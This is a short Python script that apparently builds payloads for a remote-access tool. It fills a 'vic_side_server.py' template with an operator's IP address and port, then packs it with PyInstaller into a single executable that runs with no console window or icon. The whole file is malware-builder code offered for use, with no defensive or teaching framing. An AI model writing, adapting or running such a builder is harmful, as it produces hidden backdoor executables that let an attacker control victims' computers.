import os

GREEN = "\033[0;32m"
RESET = "\033[0m"

def create_exe(ip, port, name):
    # Read the template file
    with open("Main/vic_side_server.py", "r") as file:
        code = file.read()

    # Replace placeholders with actual values
    code = code.replace("PLACEHOLDER_IP", f'"{ip}"')
    code = code.replace("PLACEHOLDER_PORT", str(port))

    # Save new customized server file
    script_name = name+".py"
    with open(script_name, "w") as file:
        file.write(code)
    
    print(f"[+] Created {script_name} with IP {ip} and Port {port}")

    # Generate EXE 
    result = os.system(f'pyinstaller --onefile --icon=nul --noconsole {script_name}')

    if result != 0:
        print("[-] PyInstaller encountered an error. Try running manually:")
        print(f'pyinstaller --onefile -i "NONE" --noconsole {script_name}')
    else:
        print(f"{GREEN}[+] For a .py file, you can use vic_server.py.{RESET}")
        print(f"{GREEN}[+] EXE generated in 'dist/' folder.{RESET}")